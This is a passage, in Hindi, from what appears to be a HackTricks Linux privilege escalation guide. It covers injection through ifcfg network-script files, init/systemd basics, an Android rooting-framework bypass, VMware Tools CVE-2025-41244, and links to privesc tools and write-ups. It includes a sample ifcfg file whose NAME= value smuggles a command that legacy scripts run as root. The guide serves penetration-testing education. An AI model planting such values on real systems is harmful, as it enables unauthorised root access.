जब कोई lower-privileged user `ifcfg-*` file बना या बदल सकता हो **और** कोई privileged network-activation path उसी सटीक file को पढ़ता हो, तो वह file जाँच का सुराग है। Effective file और directory permissions, चुने गए interface, installed `ifup`/`ifdown` implementation और उसे invoke करने वाले की पुष्टि करें। केवल writable file से execution नहीं होता। [Red Hat's RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) legacy network scripts और NetworkManager में अंतर बताती है: NetworkManager स्वयं former को trigger नहीं करता। [RHEL 8 documents](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) के अनुसार, उसका default `ifup`/`ifdown` NetworkManager का उपयोग करता है, जबकि optional legacy package shell scripts देता है।

वास्तव में privileged legacy scripts इस्तेमाल करने वाले system पर, बिना quotes वाली और shell द्वारा source की गई `ifcfg-*` assignment, जैसे `NAME=`, code-execution boundary पार कर सकती है। सटीक parser, value और activation path की पुष्टि करें; केवल filename या NetworkManager की मौजूदगी से shell interpretation का निष्कर्ष न निकालें। ऐसा sudo-allowed wrapper जो caller का input `ifcfg-*` file में लिखता है और फिर legacy `ifup` call करता है, इस boundary तक पहुँचने का एक अलग रास्ता है—भले ही caller सीधे file को edit न कर सके।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network और /bin/id के बीच की खाली जगह पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` डायरेक्टरी में System V init (SysVinit) के **scripts** होते हैं। यह **क्लासिक Linux service management system** है। इसमें services को `start`, `stop`, `restart` और कभी-कभी `reload` करने के scripts शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में मौजूद symbolic links के ज़रिए चलाया जा सकता है। Redhat systems में इसका वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` का संबंध **Upstart** से है। यह Ubuntu द्वारा शुरू किया गया नया **service management** system है, जो service management के कार्यों के लिए configuration files का उपयोग करता है। Upstart पर जाने के बावजूद, Upstart की compatibility layer के कारण SysVinit scripts का उपयोग Upstart configurations के साथ अब भी किया जाता है।

**systemd** एक आधुनिक initialization और service manager है, जो on-demand daemon starting, automount management और system state snapshots जैसी उन्नत सुविधाएँ देता है। यह distribution packages के लिए files को `/usr/lib/systemd/` में और administrator के बदलावों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration की प्रक्रिया सरल होती है।<sup>[[21]](#references)</sup>

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Restricted Shells से बाहर निकलना


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks अक्सर एक syscall को hook करते हैं, ताकि userspace manager को privileged kernel functionality उपलब्ध हो सके। Manager का कमज़ोर authentication (जैसे FD-order पर आधारित signature checks या कमज़ोर password schemes) किसी local app को manager का रूप धारण करने और पहले से rooted devices पर root तक privilege escalation करने में मदद कर सकता है। अधिक जानकारी और exploitation का विवरण यहाँ देखें:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex-based exec के ज़रिए VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery, process command lines से binary path निकालकर privileged context में उसे -v के साथ execute कर सकता है। बहुत permissive patterns (जैसे \S का उपयोग) writable locations (जैसे /tmp/httpd) में attacker द्वारा रखे गए listeners से match कर सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।<sup>[[27]](#references)</sup>

अधिक जानकारी और अन्य discovery/monitoring stacks पर लागू होने वाला सामान्यीकृत pattern यहाँ देखें:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns की enumeration करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**और scripts का संकलन**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron द्वारा चलाए गए monitor के लिए forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [बुनियादी Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation गाइड](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: 2016 की Linux Privilege Escalation तकनीकें](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [किसी को भी command execution की उम्मीद नहीं थी!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises की walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Priv Escalation के लिए सुझाव और तरकीबें](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration और Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket क्या है?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS से जुड़ें](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo भाग-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux पर ACLs को manage कैसे करें](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts के ज़रिए Redhat/CentOS root](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd क्या है?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (logs के ज़रिए bash arithmetic injection, पूरी chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – नाम कुछ भी रखें, VMware उसे elevate कर देता है (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 और CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib दस्तावेज़](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec का Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux पर Passwords की logging](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate race condition का विवरण](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 documentation – `site` और path configuration files](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
